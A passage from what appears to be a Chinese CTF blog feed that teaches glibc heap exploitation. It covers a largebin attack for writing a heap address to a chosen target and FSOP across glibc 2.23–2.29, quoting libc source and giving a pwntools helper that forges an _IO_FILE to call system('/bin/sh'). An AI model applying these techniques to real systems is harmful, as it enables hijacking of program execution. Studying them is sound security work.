class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到西面我们以前利用的地方都加上了检查，导致我们没法再从这个地方出发利用了，但是上面是没有任何保护的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">    &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实根据上面几个版本的glibc来看这里的利用思路其实是挺明显的，我们只需要修改fwd-&gt;fd-&gt;bk_nextsize也能实现上面的操作。</p><p>比如，现在存在一个已经在large bin 当中的chunk1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x460</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = largebin(index); <span class="comment">// 其实在最上面的图能够看出来这里其实保存的是largebin当中相应的位置</span></span><br><span class="line">    bk = largebin(index);</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = target<span class="number">-0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个即将放入large bin当中的chunk2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到将上面的翻译下来其实就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;fd_nextsize = largebin(index);</span><br><span class="line">chunk2-&gt;bk_nextsize = largebin(index)-&gt;bk_nextsize;<span class="comment">// 这里的largebin一定存放的是chunk1所以后面的表达式等价于chunk1-&gt;bk_nextsize也就是target-0x20</span></span><br><span class="line">*(target<span class="number">-0x20</span>)-&gt;fd_nextsize = chunk2;<span class="comment">// 前面的那个不需要管</span></span><br></pre></td></tr></table></figure><p>这样也就同样实现了任意地址写上堆地址。</p><p>任意地址写上堆地址的利用方式很多，比如VN那道题为FSOP做铺垫，或则修改global_max_fast的值到一个很大的值，为fastbin attack做铺垫，一般来说这种攻击手法都是为其他的攻击手法做铺垫的。</p><hr><p>参考链接：</p><p><a class="link"   href="https://www.anquanke.com/post/id/244018" >https://www.anquanke.com/post/id/244018<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/20190516131203-242dd8f2-7799-1.png&quot; alt=&quot;20190516131203-242dd8f2-7799-1&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="largebin attack" scheme="https://cv196082.gitee.io/tags/largebin-attack/"/>
    
  </entry>
  
  <entry>
    <title>FSOP</title>
    <link href="https://cv196082.gitee.io/2022/02/23/FSOP/"/>
    <id>https://cv196082.gitee.io/2022/02/23/FSOP/</id>
    <published>2022-02-23T03:50:09.000Z</published>
    <updated>2022-02-23T03:54:51.488Z</updated>
    
    <content type="html"><![CDATA[<p>文章开头给出_IO_FILE结构体的偏移:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h2 id="Glibc2-23下的FSOP"><a href="#Glibc2-23下的FSOP" class="headerlink" title="Glibc2.23下的FSOP"></a>Glibc2.23下的FSOP</h2><p>FSOP全称是<code>File Stream Oriented Programming</code>进程中打开的所有文件结构体使用一个单链表来进行管理，即通过<code>_IO_list_all</code>进行管理，在<a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis"><code>fopen</code></a>的分析中，我们知道了fopen是通过<code>_IO_link_in</code>函数将新打开的结构体链接进入<code>_IO_list_all</code>的，相关的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">...</span><br><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure><p>从代码中也可以看出来链表是通过FILE结构体的<code>_chain</code>字段来进行链接的。所以也就形成了链表。</p><p>看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造<code>_IO_list_all</code>中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改<code>_IO_list_all</code>直接指向可控的地址。</p><p>具体来说该如何利用呢？glibc中有一个函数<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在<code>libio\genops</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">     || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">         &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">     )</span><br><span class="line">    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">  result = EOF;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">  fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对上面代码的分析我们知道fp-&gt;_IO_write_base处保存这输出缓冲区的数据，并且长度为fp-&gt;_IO_write_ptr-fp-&gt;_IO_write_base，所以上面的if语句实际上就是判断缓冲区是否还有数据，如果有的话就会调用_IO_OVERFLOW去清空缓冲区，其中_IO_OVERFLOW是vtable当中的函数，所以我们若是能够控制_IO_list_all的话就可以控制程序执行流。</p><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时</p></li></ol><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>伪造_IO_FILE结构体，并且利用漏洞使_IO_list_all指向我们伪造的结构体(当然这里我们可以使用任意结构体_chain字段)，最终触发_IO_flush_all_lockp，绕过检查实现执行流的劫持。</p><p>其中需要绕过的也就是上面的缓冲区，所以只需要</p><blockquote><p>fp-&gt;_mode = 0;</p><p>fp-&gt;_IO_write_ptr = 1;</p><p>fp-&gt;_IO_write_base=0;</p></blockquote><p>最后把vtable修改为我们的system就好。</p><h2 id="Glibc2-24到Glibc2-27下的FSOP"><a href="#Glibc2-24到Glibc2-27下的FSOP" class="headerlink" title="Glibc2.24到Glibc2.27下的FSOP"></a>Glibc2.24到Glibc2.27下的FSOP</h2><p>在Glibc2.24下，若是直接同上面的构造方式构造就会出现报错，这是因为在这个版本的Glibc下存在一种保护机制。</p><h3 id="vtable-check机制分析"><a href="#vtable-check机制分析" class="headerlink" title="vtable check机制分析"></a>vtable check机制分析</h3><p>在执行_IO_OVERLOW时，会先执行到IO_validate_vtable函数，这是因为_IO_OVERLOW的宏定义发生了改变</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br></pre></td></tr></table></figure><p>可以看到是在最后调用vtable的函数之前调用了IO_validate_vtable函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct _IO_jump_t *</span></span><br><span class="line"><span class="function"><span class="title">IO_validate_vtable</span> <span class="params">(<span class="keyword">const</span> struct _IO_jump_t *vtable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码当中，__start___libc_IO_vtables指向了第一个vtable的地址_IO_helper_jumps，__stop___libc_IO_vtables指向了最后一个vtable函数_IO_str_chk_jumps的结束地址。上面检验的就是当前的vtable是否在这两个地址之间。因此，简单的覆盖vtable是无法通过检查的。</p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>其实在上述的check机制分析当中还存在一个检查外部vtable是否合法，不过存在的问题是我们无法控制flag，因为其是随机产生的。所以，我们使用的利用方式还是内部的vtable，使用到了vtable是_IO_str_jumps。</p><p>首先观察其源码当中定义的函数表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面是我在Glibc源码当中看到的，下面是我调试出来的：</p><p><img src="/images/image-20220223112300491.png" alt="image-20220223112300491"></p><p>不过可以看到的是源码中的JUMP_INIT_DUMMY占了16字节。所以_IO_str_finish的偏移量为0x10，而_IO_str_overflow的偏移量为0x18。</p><p>再来看_IO_str_finish的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); </span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到直接使用了fp-&gt;_s._free_buffer当作函数地址，参数即为_IO_buf_base。到了这一步，利用方式就很明显了。</p><p>下面构造结构体，同样的，我们仍需要绕过之前_IO_flush_all_lokcp函数中的检测，也就是_mode&lt;=0以及_IO_write_ptr&gt;_IO_write_base。然后重点就是vtable的地址我们不能直接的_IO_str_jumps，我们应当写入_IO_str_jumps-8，这里解释一下，因为我们在绕过_IO_flush_all_lokcp的检查后会调用到_IO_OVERFLOW函数，但是我们真正要进入的其实是_IO_str_finish函数，又因为他相对与vtable的偏移量刚好比_IO_OVERFLOW小8个字节，所以减去8即可执行到_IO_str_finish。</p><p>接着问题就是(((_IO_strfile *) fp)-&gt;_s._free_buffer)函数相对于fp的偏移量是多少，调试结果出来发现偏移量是0xe8，最后在fp-&gt;_IO_buf_base的地方写上/bin/sh的地址即可getshell。</p><p>这里给出打包的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_read_base=<span class="number">0</span>, _IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _mode=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_read_base) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(<span class="number">0</span>)+p64(_IO_buf_base)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(_mode)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line">file_struct = pack_file(IO_list_all, <span class="number">0</span>, <span class="number">1</span>, bin_sh_addr, <span class="number">0</span>, IO_str_jumps-<span class="number">8</span>)</span><br><span class="line">file_struct += p64(<span class="number">0</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>这是我上一篇复现的exp当中的函数，我是根据其他师傅的exp写的，但是这里的_IO_read_base我也没在源码中看到有什么检验，我估计不用加上也行。</p><h2 id="Glibc2-29下的FSOP"><a href="#Glibc2-29下的FSOP" class="headerlink" title="Glibc2.29下的FSOP"></a>Glibc2.29下的FSOP</h2><p>这应该是最后一个可以用FSOP的版本了，在Glibc2.31也会有这方面的使用，不过都不能直接getshell了。</p><p>首先注意的是，我们在上面使用的是_IO_str_finish函数来利用的，但是这里的函数源码发生了改变：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里直接替换成了free，所以我们这里是没有利用空间的了。</p><p>其他师傅的查找发现在_IO_wfile_jumps这个vtable里依旧存在大量的函数指针，而且当中最好利用的则是_IO_wfile_sync函数，一样的先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> delta;</span><br><span class="line">  <span class="keyword">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment"> external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> clen = (*cv-&gt;__codecvt_do_encoding) (cv);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">   wide character.  */</span></span><br><span class="line">delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">     To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">     generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">     position.  */</span></span><br><span class="line">  <span class="keyword">int</span> nread;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">  nread = (*cv-&gt;__codecvt_do_length) (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">      fp-&gt;_IO_read_base,</span><br><span class="line">      fp-&gt;_IO_read_end, delta);</span><br><span class="line">  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base + nread;</span><br><span class="line">  delta = -(fp-&gt;_IO_read_end - fp-&gt;_IO_read_base - nread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="keyword">off64_t</span>) EOF)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != WEOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到的是这两行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"><span class="keyword">int</span> clen = 